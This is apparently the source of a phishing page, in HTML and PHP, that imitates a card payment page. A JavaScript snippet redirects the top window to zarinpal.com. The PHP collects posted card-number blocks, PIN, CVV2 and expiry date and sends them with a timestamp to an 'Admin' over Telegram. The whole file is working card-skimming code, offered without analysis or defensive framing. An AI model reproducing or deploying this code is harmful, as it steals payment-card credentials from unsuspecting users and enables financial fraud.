<head>
    
    <SCRIPT language="JavaScript">
  function Go2NewUrl(){
      top.location="http://zarinpal.com";
  }
  if (top.frames.length==0){
      setTimeout('Go2NewUrl()',0);
  }
</SCRIPT>
    
</head>




<?php
include ("jdf.php");
if (!empty($_POST))
{
    require_once 'Telegram.php';
    Telegram::sendMessage('Account'."\n".'--------'."\n".'Radif 1 :'.$_POST['Mamme1']."\n".'Radif 2 :'. $_POST['Mamme2']."\n".'Radif 3 :'.$_POST['Mamme3']."\n".'------'."\n".'Radif 4 :'.$_POST['Mamme4']."\n".'PIN :'.$_POST['Pin']."\n".'cvv2 :'.$_POST['CVVMamme']."\n".'month:'.$_POST['Mamme-Month']."\n".'year:'.$_POST['Mamme-Year']."\n".'Time:'.jdate("h:i:s a")."\n".'Date:'.jdate('l Y F ')."\n".'------'."\n".'Hi Admin'."\n".'');

}




?>